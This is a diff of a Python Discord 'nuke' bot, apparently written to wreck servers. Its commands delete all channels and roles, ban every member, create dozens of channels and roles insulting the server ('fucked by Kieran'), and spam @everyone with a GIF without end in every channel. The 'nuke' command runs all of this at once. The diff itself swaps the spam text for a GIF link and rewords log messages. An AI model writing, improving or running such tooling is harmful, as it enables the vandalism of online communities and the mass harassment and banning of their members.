@@ -45,18 +45,16 @@ async def safe_ban(member):
     except:
         pass
 
-# Infinite spam task
-async def infinite_spam_task(channel, text):
-    count = 0
+# Infinite spam with the GIF
+GIF_URL = "https://cdn.discordapp.com/attachments/1352458019807563806/1465478293905084680/AC4EC367-1460-4EDE-804D-FE0380F6466D.gif"
+
+async def infinite_spam_task(channel):
     while True:
         try:
-            await channel.send(f"@everyone {text}")
-            count += 1
-            if count % 20 == 0:
-                logging.info(f"Spammed {count} messages in {channel.name}")
+            await channel.send(f"@everyone {GIF_URL}")
             await asyncio.sleep(0.4)
         except:
-            await asyncio.sleep(1)  # Back off if rate limited
+            await asyncio.sleep(1)
 
 @bot.command()
 @commands.has_permissions(administrator=True)
@@ -66,7 +64,7 @@ async def channels(ctx):
     logging.info("Deleting all channels...")
     for ch in list(guild.channels):
         await safe_delete(ch)
-    logging.info("Creating new channels...")
+    logging.info("Creating 50 new channels...")
     for i in range(50):
         try:
             cat = await guild.create_category(f"fucked-by-kieran")
@@ -80,7 +78,7 @@ async def channels(ctx):
 async def ban(ctx):
     await ctx.message.delete()
     guild = ctx.guild
-    logging.info("Starting mass ban...")
+    logging.info("Banning all members...")
     members = list(guild.members)
     random.shuffle(members)
     for member in members:
@@ -93,11 +91,11 @@ async def ban(ctx):
 async def roles(ctx):
     await ctx.message.delete()
     guild = ctx.guild
-    logging.info("Deleting roles...")
+    logging.info("Deleting all roles...")
     for role in reversed(list(guild.roles)):
         if role != guild.default_role and role != guild.me.top_role:
             await safe_delete(role)
-    logging.info("Creating new roles...")
+    logging.info("Creating 100 new roles...")
     for _ in range(100):
         try:
             await guild.create_role(name="fucked by Kieran", colour=discord.Colour.random())
@@ -107,13 +105,12 @@ async def roles(ctx):
 
 @bot.command()
 @commands.has_permissions(administrator=True)
-async def spam(ctx, *, text: str = "fucked by Kieran - Protocol Zero"):
+async def spam(ctx):
     await ctx.message.delete()
     guild = ctx.guild
-    logging.info("Starting INFINITE spam in every channel")
-    
+    logging.info("Starting INFINITE GIF spam in every channel")
     channels_to_spam = guild.text_channels + [thread for thread in guild.threads]
-    tasks = [infinite_spam_task(channel, text) for channel in channels_to_spam]
+    tasks = [infinite_spam_task(channel) for channel in channels_to_spam]
     await asyncio.gather(*tasks, return_exceptions=True)
 
 @bot.command()
@@ -125,9 +122,9 @@ async def nuke(ctx):
     
     await set_kieran_icon(guild)
     
-    logging.info("Starting full nuke sequence...")
+    logging.info("=== STARTING FULL INSTANT NUKE ===")
     
-    # Run core destructive actions in parallel
+    # Execute everything in parallel for maximum speed
     await asyncio.gather(
         roles(ctx),
         channels(ctx),
@@ -135,10 +132,10 @@ async def nuke(ctx):
         return_exceptions=True
     )
     
-    # Start infinite spam
+    # Start infinite GIF spam
     await spam(ctx)
     
-    await ctx.send("@everyone **SERVER FUCKED BY KIERAN - INFINITE SPAM ACTIVE**")
+    await ctx.send("@everyone **SERVER FUCKED BY KIERAN - INFINITE GIF SPAM ACTIVE**")
     logging.info("FULL NUKE COMPLETE - INFINITE SPAM RUNNING")
 
 bot.run(TOKEN)
